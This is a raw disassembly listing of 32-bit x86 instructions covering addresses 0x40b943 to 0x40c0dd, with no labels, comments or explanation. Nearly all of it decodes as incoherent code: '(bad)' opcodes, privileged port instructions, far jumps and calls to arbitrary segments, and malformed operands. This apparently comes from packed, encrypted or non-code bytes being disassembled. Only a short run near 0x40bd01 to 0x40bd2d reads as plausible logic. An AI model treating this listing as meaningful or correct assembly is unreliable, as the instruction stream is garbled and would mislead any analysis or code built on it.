  40b943:	shl    BYTE PTR [ebx+0x511c66fb],cl
  40b949:	xchg   ebx,eax
  40b94a:	cmc    
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b91d
  40b954:	push   0x3c
  40b956:	push   es
  40b957:	cmp    esi,eax
  40b959:	adc    dl,BYTE PTR [eax+0x30067772]
  40b95f:	aad    0xb4
  40b961:	mov    ds:0x4d4baa4,eax
  40b966:	jmp    0x40b96a
  40b968:	push   ebp
  40b969:	push   edi
  40b96a:	mov    ds:0x62828cb6,al
  40b96f:	pop    ebp
  40b970:	jg     0x40b927
  40b972:	add    al,ch
  40b974:	inc    ecx
  40b975:	mov    ebp,0xf1aa81ca
  40b97a:	and    al,0x5f
  40b97c:	adc    eax,0x65557caa
  40b981:	mov    esi,esi
  40b983:	into   
  40b984:	in     eax,dx
  40b985:	mov    ds:0xebb5d049,eax
  40b98a:	sbb    BYTE PTR [ebp+0x13],ah
  40b98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b98e:	ins    BYTE PTR es:[edi],dx
  40b98f:	sbb    BYTE PTR ds:0x6b59c24e,dl
  40b995:	and    eax,0x576599b8
  40b99a:	or     DWORD PTR [edx+0x10],ecx
  40b99d:	stc    
  40b99e:	js     0x40b9e3
  40b9a0:	mov    ds:0xec85d341,eax
  40b9a5:	enter  0x5756,0x50
  40b9a9:	(bad)  
  40b9aa:	jbe    0x40b9da
  40b9ac:	out    dx,eax
  40b9ad:	loop   0x40b97c
  40b9af:	mov    ecx,0x98104770
  40b9b4:	dec    ebx
  40b9b5:	or     BYTE PTR [eax+0x6b],dl
  40b9b8:	(bad)  
  40b9b9:	popf   
  40b9ba:	into   
  40b9bb:	fstp   QWORD PTR [ecx-0x44447ae8]
  40b9c1:	out    0x17,eax
  40b9c3:	push   0x8237a4f4
  40b9c8:	adc    DWORD PTR [ecx+0x7],edi
  40b9cb:	fcomi  st,st(1)
  40b9cd:	mov    bl,dl
  40b9cf:	inc    edi
  40b9d0:	out    dx,eax
  40b9d1:	hlt    
  40b9d2:	sbb    al,BYTE PTR [edi]
  40b9d4:	popa   
  40b9d5:	neg    ch
  40b9d7:	mov    esp,ebp
  40b9d9:	mov    eax,ss:0xfd73abe1
  40b9df:	push   0x49efa9a4
  40b9e4:	les    edi,FWORD PTR [eax]
  40b9e6:	in     al,0xc7
  40b9e8:	jl     0x40b9d1
  40b9ea:	ds lock es xor edi,ebx
  40b9ef:	and    cl,cl
  40b9f1:	or     esp,ecx
  40b9f3:	aas    
  40b9f4:	mov    ebx,esi
  40b9f6:	stos   DWORD PTR es:[edi],eax
  40b9f7:	or     eax,0xe819097
  40b9fc:	push   esi
  40b9fd:	addr16 shl eax,0xe8
  40ba01:	mov    ?,WORD PTR [esi]
  40ba03:	push   edx
  40ba04:	cmp    dl,bh
  40ba06:	cmp    ecx,DWORD PTR [eax]
  40ba08:	ss shr esi,1
  40ba0b:	xor    al,0xca
  40ba0d:	inc    esi
  40ba0e:	popf   
  40ba0f:	xchg   ebx,eax
  40ba10:	retf   
  40ba11:	jns    0x40b9a3
  40ba13:	jmp    0x7df690c6
  40ba18:	mov    BYTE PTR [esp+ebx*1-0x1e08e137],0x36
  40ba20:	adc    bl,al
  40ba22:	(bad)  
  40ba24:	cs or  al,0x5c
  40ba27:	pusha  
  40ba28:	xchg   DWORD PTR [ecx+eax*4+0x66fc1e91],eax
  40ba2f:	popf   
  40ba30:	and    DWORD PTR [esi],0xffffffe9
  40ba33:	imul   BYTE PTR [eax-0x6bfe82b2]
  40ba39:	fdivp  st(7),st
  40ba3b:	(bad)  
  40ba3d:	push   esp
  40ba3e:	fbstp  TBYTE PTR [ecx+0x13d118f9]
  40ba44:	das    
  40ba45:	mov    cl,0x4b
  40ba47:	pop    ebx
  40ba48:	mov    cl,0xc5
  40ba4a:	bnd ret 
  40ba4c:	imul   eax,DWORD PTR ds:0xc72eff8f,0xe27c0406
  40ba56:	fs repnz iret 
  40ba59:	sbb    esp,ecx
  40ba5b:	out    0xec,al
  40ba5d:	pop    ss
  40ba5e:	xor    BYTE PTR [edx+0x5f39a609],dl
  40ba64:	cmp    bh,bl
  40ba66:	mov    ebx,0x2ed232f2
  40ba6b:	pushf  
  40ba6c:	mov    ds:0x1ce77d08,eax
  40ba71:	ss mov bl,0x2
  40ba74:	pop    eax
  40ba75:	push   esp
  40ba76:	cmp    eax,0xceba6efb
  40ba7b:	ret    
  40ba7c:	ss js  0x40ba6e
  40ba7f:	scas   al,BYTE PTR es:[edi]
  40ba80:	xchg   edx,eax
  40ba81:	cs jo  0x40baed
  40ba84:	xchg   ebp,eax
  40ba85:	dec    ebx
  40ba86:	into   
  40ba87:	dec    eax
  40ba88:	rcr    edx,0x75
  40ba8b:	into   
  40ba8c:	jo     0x40bac3
  40ba8e:	xchg   edi,eax
  40ba8f:	pop    esi
  40ba90:	js     0x40ba50
  40ba92:	jmp    0x11f818e0
  40ba97:	and    ecx,DWORD PTR [ecx+eiz*2-0x1c97910c]
  40ba9e:	mov    esp,0xfcdaa2c6
  40baa3:	push   ss
  40baa4:	xor    al,0xbd
  40baa6:	cmp    edi,ebp
  40baa8:	mov    esp,0x9e463c42
  40baad:	push   0xb04ad9f9
  40bab2:	mov    cl,0x28
  40bab4:	inc    ecx
  40bab5:	dec    eax
  40bab6:	and    DWORD PTR [esi],edi
  40bab8:	mov    ebp,0x3630f704
  40babd:	or     cl,dh
  40babf:	adc    DWORD PTR [ebp-0x21],ecx
  40bac2:	loope  0x40baf8
  40bac4:	div    BYTE PTR [eax]
  40bac6:	loope  0x40ba4f
  40bac8:	ficom  DWORD PTR [ebx+0x413b8e78]
  40bace:	cdq    
  40bacf:	mov    cl,0x6a
  40bad1:	xchg   DWORD PTR [esi],edi
  40bad3:	jle    0x40ba97
  40bad5:	pop    esp
  40bad6:	xchg   DWORD PTR [ebx+0x473db165],esi
  40badc:	rol    DWORD PTR [ebp+0x43268974],cl
  40bae2:	push   ebp
  40bae3:	and    bh,dl
  40bae5:	or     eax,0xd642882a
  40baea:	loopne 0x40bb16
  40baec:	jb     0x40bad6
  40baee:	jbe    0x40ba80
  40baf0:	cld    
  40baf1:	mov    ds:0x9f1aff83,al
  40baf6:	paddusb mm4,QWORD PTR [esi+edi*2-0x66]
  40bafb:	push   eax
  40bafc:	mov    ds:0x893389a2,al
  40bb01:	stc    
  40bb02:	cdq    
  40bb03:	ret    
  40bb04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb05:	fiadd  WORD PTR [esi+0x10]
  40bb08:	cmp    al,0x7d
  40bb0a:	jmp    0x4c66:0xb47f98e9
  40bb11:	leave  
  40bb12:	cmp    DWORD PTR [ebx],ebp
  40bb14:	sub    eax,0x71f07060
  40bb19:	out    dx,al
  40bb1a:	ror    BYTE PTR es:[esp+ebp*8-0x3c],1
  40bb1f:	les    ecx,FWORD PTR [esi]
  40bb21:	push   ds
  40bb22:	(bad)  
  40bb23:	cs dec edi
  40bb25:	ficom  WORD PTR [eax-0x2dfaa484]
  40bb2b:	push   ecx
  40bb2c:	leave  
  40bb2d:	jbe    0x40bb4d
  40bb2f:	loop   0x40bb1b
  40bb31:	sar    BYTE PTR [esi+0x48],0x3
  40bb35:	xor    eax,DWORD PTR [ebx+eiz*4+0x29]
  40bb39:	jle    0x40bae1
  40bb3b:	add    eax,0x56764cd0
  40bb40:	(bad)  
  40bb41:	jle    0x40bad8
  40bb43:	pop    edi
  40bb44:	sub    dl,BYTE PTR [ebx]
  40bb46:	push   ebp
  40bb47:	xchg   edx,eax
  40bb48:	adc    eax,0xf7b49673
  40bb4d:	and    BYTE PTR [eax+0x4d26f9c1],bh
  40bb53:	imul   esi,DWORD PTR [ecx-0x716ec816],0xffffffa3
  40bb5a:	mov    esp,0xe7620340
  40bb5f:	call   0x8de5:0x6b7c8c45
  40bb66:	or     al,0xf4
  40bb68:	shl    cl,1
  40bb6a:	cmp    al,0xc5
  40bb6c:	fcom   DWORD PTR [ebx]
  40bb6e:	dec    ebx
  40bb6f:	mov    ds:0xf6f688d,al
  40bb74:	popa   
  40bb75:	inc    esi
  40bb76:	int    0x24
  40bb78:	jns    0x40bb2c
  40bb7a:	pop    esp
  40bb7b:	lods   eax,DWORD PTR ds:[esi]
  40bb7c:	mov    ah,0xfc
  40bb7e:	mov    ?,WORD PTR [edi]
  40bb80:	add    al,0xa4
  40bb82:	lahf   
  40bb83:	std    
  40bb84:	mov    al,0x26
  40bb86:	pop    es
  40bb87:	clc    
  40bb88:	clc    
  40bb89:	les    edx,FWORD PTR ds:0x8ed6c5a
  40bb8f:	scas   al,BYTE PTR es:[edi]
  40bb90:	(bad)  
  40bb91:	shl    BYTE PTR [edx-0x2245de4f],0xa9
  40bb98:	das    
  40bb99:	imul   edx,DWORD PTR [ebp-0x661ad537],0x5
  40bba0:	shl    DWORD PTR [esp+ebx*8+0x38e3f982],cl
  40bba7:	mov    edi,0xdf3004bf
  40bbac:	mov    edx,0xd354c2da
  40bbb1:	pop    ss
  40bbb2:	dec    eax
  40bbb3:	test   al,0x4d
  40bbb5:	or     cl,dh
  40bbb7:	sbb    al,0xa3
  40bbb9:	jns    0x40bb6b
  40bbbb:	push   esp
  40bbbc:	mov    dl,BYTE PTR [ebp+eiz*4+0x7cdc1205]
  40bbc3:	hlt    
  40bbc4:	mov    eax,0x10854e00
  40bbc9:	loopne 0x40bb6c
  40bbcb:	push   esi
  40bbcc:	mov    ebx,0x2f03c744
  40bbd1:	pop    esp
  40bbd2:	out    dx,al
  40bbd3:	add    al,BYTE PTR [edi-0x46]
  40bbd6:	les    ebx,FWORD PTR [esi+0xcf186ca]
  40bbdc:	or     eax,0xa825a1bd
  40bbe1:	pop    esi
  40bbe2:	aas    
  40bbe3:	and    al,0x66
  40bbe5:	push   edi
  40bbe6:	xor    dl,BYTE PTR [edx+0x18eda91f]
  40bbec:	push   edx
  40bbed:	adc    al,0x10
  40bbef:	mov    edx,0x5320ce5b
  40bbf4:	ins    BYTE PTR es:[edi],dx
  40bbf5:	push   eax
  40bbf6:	aad    0x57
  40bbf8:	scas   al,BYTE PTR es:[edi]
  40bbf9:	adc    eax,0xe73d10b5
  40bbfe:	rcr    dl,1
  40bc00:	ror    BYTE PTR [esi-0x4],0xd2
  40bc04:	push   ds
  40bc05:	(bad)  
  40bc07:	repnz aaa 
  40bc09:	popa   
  40bc0a:	and    eax,0x84b783f6
  40bc0f:	jne    0x40bbdf
  40bc11:	in     al,dx
  40bc12:	inc    eax
  40bc13:	pushf  
  40bc14:	lds    esp,FWORD PTR [esi+0x63]
  40bc17:	into   
  40bc18:	fs push es
  40bc1a:	mov    DWORD PTR [edi],esp
  40bc1c:	mov    edx,0x2c321abf
  40bc21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc22:	ja     0x40bba9
  40bc24:	rcl    BYTE PTR [edi],cl
  40bc26:	mov    eax,0x49c084eb
  40bc2b:	addr16 loop 0x40bca3
  40bc2e:	pop    ebp
  40bc2f:	jb     0x40bbff
  40bc31:	jl     0x40bc0c
  40bc33:	adc    dh,BYTE PTR [esi+0x635dc966]
  40bc39:	dec    esp
  40bc3a:	sub    eax,0x301a6c4f
  40bc3f:	out    dx,al
  40bc40:	mov    eax,0xa0ff8c15
  40bc45:	cs mov esi,0x268e82dc
  40bc4b:	cmc    
  40bc4c:	sbb    ch,BYTE PTR [esi+0x62745c5]
  40bc52:	icebp  
  40bc53:	or     bh,BYTE PTR [ebp+0x666eceae]
  40bc59:	mov    eax,ds
  40bc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5c:	call   0x9944:0xfc615140
  40bc63:	int    0x67
  40bc65:	iret   
  40bc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc67:	popf   
  40bc68:	inc    eax
  40bc69:	mov    ecx,eax
  40bc6b:	pop    edi
  40bc6c:	cmp    al,0x24
  40bc6e:	aas    
  40bc6f:	mov    esi,0x776018a1
  40bc74:	mov    esp,0x89527e22
  40bc79:	adc    eax,0x23a1cfa5
  40bc7e:	mov    eax,0x5ef092aa
  40bc83:	in     al,0xe7
  40bc85:	scas   eax,DWORD PTR es:[edi]
  40bc86:	in     eax,dx
  40bc87:	or     al,0x43
  40bc89:	bound  ebp,QWORD PTR [ecx+0x232910b]
  40bc8f:	inc    ecx
  40bc90:	or     eax,0x1c836ff8
  40bc95:	sub    BYTE PTR [ebx],cl
  40bc97:	mov    WORD PTR [eax-0x1a],fs
  40bc9a:	fdivr  DWORD PTR [ebp+0x5c]
  40bc9d:	sub    al,0x92
  40bc9f:	and    eax,0x9a9d47c7
  40bca4:	mov    ebp,0x8d9ea33c
  40bca9:	cld    
  40bcaa:	repz adc cl,BYTE PTR [ebp+0x15]
  40bcae:	mov    ch,BYTE PTR [ebx+0x75]
  40bcb1:	mov    edi,0xa538527c
  40bcb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb7:	rcr    DWORD PTR [edx],cl
  40bcb9:	add    dl,0x47
  40bcbc:	xor    al,0xf5
  40bcbe:	xchg   edx,eax
  40bcbf:	adc    eax,0x141b2159
  40bcc4:	xchg   ebx,eax
  40bcc5:	not    BYTE PTR [edx-0x2f]
  40bcc8:	sar    eax,0x3e
  40bccb:	dec    edx
  40bccc:	inc    edx
  40bccd:	sbb    eax,0xfd4962ec
  40bcd2:	xchg   ebx,eax
  40bcd3:	not    cl
  40bcd5:	cmp    eax,0x1419439d
  40bcda:	adc    edi,edx
  40bcdc:	aam    0xe8
  40bcde:	in     eax,dx
  40bcdf:	loopne 0x40bcbc
  40bce1:	call   0xa31e:0x50987b1c
  40bce8:	clc    
  40bce9:	in     al,dx
  40bcea:	pushf  
  40bceb:	outs   dx,BYTE PTR ds:[esi]
  40bcec:	ins    DWORD PTR es:[edi],dx
  40bced:	dec    ecx
  40bcee:	mov    ds:0x2d8b7d3c,al
  40bcf3:	lea    ecx,[ebx-0x20d40fa3]
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ch,cl
  40bd3f:	ret    0xc869
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bcdb
  40bd4b:	sub    cl,BYTE PTR [esi+0x4c94b0d7]
  40bd51:	mov    bh,0x49
  40bd53:	cmp    edi,DWORD PTR [eax]
  40bd55:	or     BYTE PTR [esi],bh
  40bd57:	icebp  
  40bd58:	(bad)  
  40bd59:	sbb    al,0x48
  40bd5b:	mov    ecx,0x1bd5bab2
  40bd60:	ret    0xeb58
  40bd63:	pushf  
  40bd64:	jge    0x40bd13
  40bd66:	push   cs
  40bd67:	push   0xffffffa2
  40bd69:	test   eax,0x45f7aef6
  40bd6e:	js     0x40bd8c
  40bd70:	jl     0x40bded
  40bd72:	jp     0x40bd7d
  40bd74:	inc    edx
  40bd75:	fnstenv [esi+0x69]
  40bd78:	daa    
  40bd79:	jmp    0x40bd4d
  40bd7b:	ss dec ecx
  40bd7d:	inc    esi
  40bd7e:	mov    ecx,0xbfcab099
  40bd83:	or     DWORD PTR [ebx-0x21],ecx
  40bd86:	jnp    0x40bdba
  40bd88:	ja     0x40bdaf
  40bd8a:	jo     0x40bd98
  40bd8c:	dec    eax
  40bd8d:	inc    esp
  40bd8e:	xchg   esp,eax
  40bd8f:	call   0x5aa9d545
  40bd94:	mov    ds:0xd3f4b81e,al
  40bd99:	iret   
  40bd9a:	push   esp
  40bd9b:	fisub  DWORD PTR [ecx]
  40bd9d:	pop    esi
  40bd9e:	outs   dx,BYTE PTR ds:[esi]
  40bd9f:	xchg   ebp,eax
  40bda0:	and    DWORD PTR [eax-0x36],ebx
  40bda3:	push   ebp
  40bda4:	sub    DWORD PTR [ebx],0x4a131571
  40bdaa:	cmp    al,0x39
  40bdac:	shl    BYTE PTR ds:0x54f7e8ce,cl
  40bdb2:	js     0x40bdb6
  40bdb4:	mov    al,ds:0x6a75d15c
  40bdb9:	cli    
  40bdba:	dec    ebp
  40bdbb:	dec    eax
  40bdbc:	or     cl,ch
  40bdbe:	push   esi
  40bdbf:	xchg   ebx,eax
  40bdc0:	sub    DWORD PTR [edx+0x24a1b692],esi
  40bdc6:	sub    DWORD PTR [ecx-0x6f],esi
  40bdc9:	cmp    esp,ecx
  40bdcb:	ins    BYTE PTR es:[edi],dx
  40bdcc:	cmp    BYTE PTR [ecx-0x659cfd74],0x82
  40bdd3:	stos   BYTE PTR es:[edi],al
  40bdd4:	fistp  WORD PTR [ebx]
  40bdd6:	jo     0x40bd58
  40bdd8:	sub    BYTE PTR [eax+0x26],al
  40bddb:	cld    
  40bddc:	or     eax,0x38305c80
  40bde1:	mov    ebp,0x3bfedfa6
  40bde6:	fistp  QWORD PTR [ebp+0x6b]
  40bde9:	push   0xffffff8a
  40bdeb:	sbb    eax,0xa69ac1b0
  40bdf0:	out    0xda,eax
  40bdf2:	and    dl,BYTE PTR [esi-0x50]
  40bdf5:	cmc    
  40bdf6:	push   ebx
  40bdf7:	dec    ebx
  40bdf8:	lahf   
  40bdf9:	inc    ebx
  40bdfa:	and    DWORD PTR [ecx-0x41],eax
  40bdfd:	daa    
  40bdfe:	scas   al,BYTE PTR es:[edi]
  40bdff:	test   al,0xed
  40be01:	retf   0x3300
  40be04:	xor    bh,BYTE PTR [edi-0x5d809e65]
  40be0a:	stos   BYTE PTR es:[edi],al
  40be0b:	rol    DWORD PTR [eax-0x4a],1
  40be0e:	dec    eax
  40be0f:	dec    edi
  40be10:	fldl2e 
  40be12:	call   0x52f67fe4
  40be17:	mov    edi,0xb332861f
  40be1c:	gs in  al,dx
  40be1e:	xchg   esp,eax
  40be1f:	jno    0x40be0b
  40be21:	(bad)  
  40be22:	sub    ah,al
  40be24:	dec    ecx
  40be25:	and    DWORD PTR [esi],edi
  40be27:	add    cl,BYTE PTR [eax+0x48]
  40be2a:	imul   eax,DWORD PTR [esi],0xffffffd6
  40be2d:	sbb    esp,ebp
  40be2f:	fcmovb st,st(1)
  40be31:	inc    edx
  40be32:	mov    edi,0x20cff5af
  40be37:	(bad)  
  40be38:	mov    edi,0xee7527d4
  40be3d:	jp     0x40be26
  40be3f:	enter  0x47ad,0x8d
  40be43:	sar    DWORD PTR [ecx-0x6a],cl
  40be46:	test   BYTE PTR [ecx+ebp*2],0x2a
  40be4a:	lods   al,BYTE PTR ds:[esi]
  40be4b:	and    BYTE PTR [eax-0x3c],bl
  40be4e:	das    
  40be4f:	rcr    DWORD PTR [edi+esi*2],0x72
  40be53:	mov    bl,dl
  40be55:	push   eax
  40be56:	scas   eax,DWORD PTR es:[edi]
  40be57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be58:	dec    ebx
  40be59:	mov    ecx,0x1eef2218
  40be5e:	cld    
  40be5f:	xor    ecx,DWORD PTR [esi+0x31614c89]
  40be65:	lods   eax,DWORD PTR ds:[esi]
  40be66:	inc    esp
  40be67:	mov    dl,0xc8
  40be69:	bound  edi,QWORD PTR [edx-0x60]
  40be6c:	or     cl,BYTE PTR [ecx+0x2f]
  40be6f:	adc    DWORD PTR [edi+0x1e5e812d],eax
  40be75:	adc    al,0xd0
  40be77:	mov    edx,0x891c685f
  40be7c:	xchg   ebx,eax
  40be7d:	adc    DWORD PTR [ebx-0x47],ebp
  40be80:	test   DWORD PTR [ecx],ebx
  40be82:	leave  
  40be83:	pop    ds
  40be84:	dec    eax
  40be85:	adc    BYTE PTR [edx-0x67a2505e],al
  40be8b:	out    dx,eax
  40be8c:	rcl    BYTE PTR [edi],cl
  40be8e:	test   al,0x61
  40be90:	popa   
  40be91:	das    
  40be92:	push   eax
  40be93:	add    BYTE PTR [edx-0x32dcee99],ah
  40be99:	mov    esi,0x864bd6a
  40be9e:	int3   
  40be9f:	cmp    DWORD PTR [esi-0x4d3c0129],edi
  40bea5:	stc    
  40bea6:	adc    bh,bh
  40bea8:	call   0x3864:0x4c0b463c
  40beaf:	movaps XMMWORD PTR [edx+0x20],xmm4
  40beb3:	and    dh,BYTE PTR [ecx-0x12a3b658]
  40beb9:	ja     0x40be97
  40bebb:	dec    esi
  40bebc:	daa    
  40bebd:	loope  0x40bea1
  40bebf:	ficomp WORD PTR [edi-0xd]
  40bec2:	jecxz  0x40befb
  40bec4:	push   edx
  40bec5:	xchg   esi,eax
  40bec6:	push   edi
  40bec7:	repz mov eax,0xbba5ef0c
  40becd:	data16 in al,dx
  40becf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed0:	cmc    
  40bed1:	int3   
  40bed2:	mov    dl,0xeb
  40bed4:	push   ecx
  40bed5:	cs js  0x40bef7
  40bed8:	inc    edx
  40bed9:	adc    eax,0x43c338cb
  40bede:	stc    
  40bedf:	jmp    0x40be9d
  40bee1:	test   ah,ch
  40bee3:	cs js  0x40be92
  40bee6:	cmp    DWORD PTR [edx+ecx*4],ecx
  40bee9:	ror    DWORD PTR [eax+eiz*8],0x61
  40beed:	sbb    esp,DWORD PTR [ecx-0x41b6ceac]
  40bef3:	std    
  40bef4:	add    BYTE PTR [edi+0x58],ah
  40bef7:	add    BYTE PTR [edx],bh
  40bef9:	repz or DWORD PTR [ebp+ebx*8-0x26ff3df0],ebx
  40bf01:	scas   eax,DWORD PTR es:[edi]
  40bf02:	jp     0x40bf26
  40bf04:	cmp    ebx,edi
  40bf06:	cs daa 
  40bf08:	mov    eax,ds:0x3c7be3b
  40bf0d:	adc    eax,DWORD PTR [ecx+0x3a]
  40bf10:	cs push esi
  40bf12:	retf   
  40bf13:	in     eax,0xba
  40bf15:	xchg   BYTE PTR [eax],ch
  40bf17:	mov    esi,0x4c07168b
  40bf1c:	outs   dx,DWORD PTR ds:[esi]
  40bf1d:	in     eax,dx
  40bf1e:	cmp    al,0xca
  40bf20:	fstp   QWORD PTR [ecx]
  40bf22:	push   eax
  40bf23:	hlt    
  40bf24:	mov    ah,ch
  40bf26:	xchg   ebx,eax
  40bf27:	into   
  40bf28:	inc    esp
  40bf29:	sbb    edx,DWORD PTR [edx+ecx*8-0x15]
  40bf2d:	in     eax,0xac
  40bf2f:	dec    eax
  40bf30:	les    esp,FWORD PTR [ebx+0x2ab47a2d]
  40bf36:	mov    al,0x5e
  40bf38:	(bad)  
  40bf39:	push   ss
  40bf3a:	mov    edx,0x1aa4be97
  40bf3f:	int3   
  40bf40:	pop    es
  40bf41:	mov    edx,eax
  40bf43:	and    eax,0xf702d7bf
  40bf48:	neg    bl
  40bf4a:	jle    0x40bf25
  40bf4c:	imul   ebp,ebx,0x6797c155
  40bf52:	pop    es
  40bf53:	in     al,dx
  40bf54:	add    eax,0x7b1b5093
  40bf59:	pop    ecx
  40bf5a:	push   esp
  40bf5b:	mov    edi,0x8c701582
  40bf60:	xchg   ebx,eax
  40bf61:	and    BYTE PTR [ecx-0x58],0x71
  40bf65:	mov    ds:0xd74a52ea,al
  40bf6a:	inc    esp
  40bf6b:	inc    esp
  40bf6c:	fimul  WORD PTR [ebp-0x57cb1a7]
  40bf72:	lahf   
  40bf73:	jb     0x40bf6d
  40bf75:	mov    ecx,gs
  40bf77:	or     dl,BYTE PTR [edx+0x5274efe9]
  40bf7d:	cmp    dl,BYTE PTR [ebx]
  40bf7f:	(bad)  
  40bf80:	hlt    
  40bf81:	stos   BYTE PTR es:[edi],al
  40bf82:	loop   0x40bf67
  40bf84:	xor    DWORD PTR [ebx+0x210bc916],edx
  40bf8a:	iret   
  40bf8b:	fld    TBYTE PTR [edi]
  40bf8d:	add    al,BYTE PTR [eax-0x2bfdbc0b]
  40bf93:	outs   dx,DWORD PTR ds:[esi]
  40bf94:	push   ecx
  40bf95:	ins    BYTE PTR es:[edi],dx
  40bf96:	shl    ch,0x14
  40bf99:	push   0x20012bf8
  40bf9e:	mov    eax,ds:0x3a1323be
  40bfa3:	in     eax,0x7b
  40bfa5:	fsub   DWORD PTR [edx-0x1bf13551]
  40bfab:	sbb    cl,bl
  40bfad:	push   cs
  40bfae:	cmp    eax,0x7cb9ae5d
  40bfb3:	mov    edi,DWORD PTR [edi+0x3a41918d]
  40bfb9:	mov    ch,0xd3
  40bfbb:	loopne 0x40bf8a
  40bfbd:	jg     0x40bff0
  40bfbf:	inc    ecx
  40bfc0:	jl     0x40bfb1
  40bfc2:	pop    eax
  40bfc3:	jge    0x40bff7
  40bfc5:	mov    BYTE PTR [edi+esi*4+0x4bbd4029],cl
  40bfcc:	xor    BYTE PTR [edx+ebp*2],ah
  40bfcf:	sti    
  40bfd0:	imul   ecx,DWORD PTR [edi+0xdbf7cd3],0xffffffce
  40bfd7:	aam    0xd2
  40bfd9:	popf   
  40bfda:	popf   
  40bfdb:	jo     0x40bfb9
  40bfdd:	or     DWORD PTR [eax+edi*8],ebx
  40bfe0:	int3   
  40bfe1:	and    ebx,DWORD PTR [eax-0x327dd24b]
  40bfe7:	add    DWORD PTR [edx+0x7a],esi
  40bfea:	inc    esi
  40bfeb:	adc    esi,DWORD PTR [ebx-0x8e729e1]
  40bff1:	jp     0x40bf81
  40bff3:	shr    BYTE PTR [edi+0x545fb56f],0x9e
  40bffa:	inc    edx
  40bffb:	das    
  40bffc:	test   DWORD PTR [edi-0x74],eax
  40bfff:	retf   
  40c000:	repz js 0x40bfa1
  40c003:	jmp    0xcc5a:0xce379b79
  40c00a:	sbb    edx,ecx
  40c00c:	sbb    DWORD PTR [ecx+0x5c2b7f06],esp
  40c012:	push   edi
  40c013:	inc    esi
  40c014:	adc    esp,edi
  40c016:	push   edi
  40c017:	add    ch,BYTE PTR [edi+0xd177da]
  40c01d:	jmp    0x857f:0x885ac1fe
  40c024:	mov    ds:0xc25b4c18,eax
  40c029:	and    al,BYTE PTR [eax]
  40c02b:	and    BYTE PTR [ebp-0x27],ch
  40c02e:	jmp    0x40c060
  40c030:	das    
  40c031:	inc    edx
  40c032:	pop    ebp
  40c033:	addr16 das 
  40c035:	ret    0x922f
  40c038:	push   ebx
  40c039:	pop    ss
  40c03a:	call   0xae0ba7fb
  40c03f:	and    dh,BYTE PTR [eax]
  40c041:	adc    eax,0x900ba8a3
  40c046:	ins    DWORD PTR es:[edi],dx
  40c047:	mov    ch,0xb6
  40c049:	repz sbb bl,BYTE PTR [ecx-0x70c23191]
  40c050:	iret   
  40c051:	bnd jmp 0x28ee714e
  40c057:	lods   eax,DWORD PTR ds:[esi]
  40c058:	jle    0x40c08d
  40c05a:	mov    esi,0x8b5fb67b
  40c05f:	or     ebx,DWORD PTR [ecx-0x76]
  40c062:	(bad)  
  40c063:	out    0x25,eax
  40c065:	mov    ebp,DWORD PTR [edx+0x3c]
  40c068:	fidivr WORD PTR [esp+eax*8-0x36]
  40c06c:	scas   eax,DWORD PTR es:[edi]
  40c06d:	mov    DWORD PTR [esi-0x52d5163d],edx
  40c073:	mov    bl,0x90
  40c075:	pusha  
  40c076:	ins    BYTE PTR es:[edi],dx
  40c077:	xor    DWORD PTR [ecx+0x75af800c],0x65d7f946
  40c081:	dec    edi
  40c082:	mov    BYTE PTR [eax-0x35],dl
  40c085:	adc    al,0x4
  40c087:	sub    dl,BYTE PTR [esi+esi*4+0x1b]
  40c08b:	leave  
  40c08c:	jmp    0x40c0ef
  40c08e:	inc    edi
  40c08f:	out    dx,al
  40c090:	mov    bh,0x56
  40c092:	loope  0x40c0bb
  40c094:	and    ecx,DWORD PTR [edx-0x1d]
  40c097:	js     0x40c0d0
  40c099:	add    al,0xf8
  40c09b:	jns    0x40c102
  40c09d:	addr16 mov eax,0x13f8c3d0
  40c0a3:	push   ebx
  40c0a4:	aas    
  40c0a5:	retf   0xe426
  40c0a8:	into   
  40c0a9:	or     BYTE PTR ds:0x5f1cdf15,0x98
  40c0b0:	cmc    
  40c0b1:	jmp    0x40c0d5
  40c0b3:	pop    ds
  40c0b4:	jb     0x40c12d
  40c0b6:	into   
  40c0b7:	mov    esi,0x346e4444
  40c0bc:	cmc    
  40c0bd:	(bad)  
  40c0be:	enter  0x5c03,0x6f
  40c0c2:	stos   DWORD PTR es:[edi],eax
  40c0c3:	ret    0xd641
  40c0c6:	pushf  
  40c0c7:	xchg   ebp,eax
  40c0c8:	ss leave 
  40c0ca:	push   edx
  40c0cb:	xchg   ebp,eax
  40c0cc:	add    BYTE PTR [eax+0x5d66cc89],ch
  40c0d2:	aam    0x3b
  40c0d4:	xchg   edx,eax
  40c0d5:	dec    esp
  40c0d7:	or     DWORD PTR [ebp-0x22],ebx
  40c0da:	xor    eax,esp
  40c0dc:	xchg   ecx,eax
  40c0dd:	dec    ebp
